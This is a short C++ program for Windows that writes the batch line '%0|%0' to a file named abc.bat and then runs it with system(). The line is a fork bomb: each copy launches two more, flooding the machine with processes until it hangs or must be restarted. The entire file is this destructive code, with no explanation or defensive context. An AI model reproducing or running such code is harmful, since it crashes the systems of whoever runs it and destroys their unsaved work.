#include <Windows.h>
#include <iostream>
#include <fstream>
using namespace std;
 
int main()
{
        char a[9] = "abc.bat";
        
        ofstream file_out(a);
        file_out<<"%0|%0";
        file_out.close();
        
        system( a );
        
        return 0;
}